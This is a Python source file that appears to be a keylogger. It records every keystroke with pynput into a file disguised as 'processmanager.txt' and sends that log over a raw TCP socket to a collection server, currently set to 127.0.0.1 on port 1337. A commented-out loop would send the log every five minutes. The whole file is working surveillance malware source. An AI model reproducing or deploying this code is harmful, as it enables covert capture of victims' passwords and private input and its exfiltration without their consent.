import socket
import os
from pynput.keyboard import Listener
import time

#path = os.environ['appdata'] +'\\processmanager.txt'       # For Windows

HOST = "127.0.0.1"  
PORT = 1337

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 1024 

filename = "processmanager.txt"

global filesize
filesize = 0

def send_file_to_server():
    filesize = os.path.getsize(filename)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        print(f"[+] Connecting to {HOST}:{PORT}")
        client_socket.connect((HOST, PORT))
        print("[+] Connected.")
        client_socket.send(f"{filename}{SEPARATOR}{filesize}".encode())  
    
        print(f"Sending {filename}")
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                client_socket.sendall(bytes_read)

def write_file(key):
    with open(filename, 'a') as f:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('ctrl') > 0:
                f.write(' Ctrl ')
            elif k.find('Key'):
                f.write(k)

try:
    with Listener(on_press=write_file) as listener:
        listener.join()
except KeyboardInterrupt as e:
    print(e)
    send_file_to_server()


"""
for future use!
while(True):
    filesize = os.path.getsize(filename)  
    send_file_to_server()
    time.sleep(300)
"""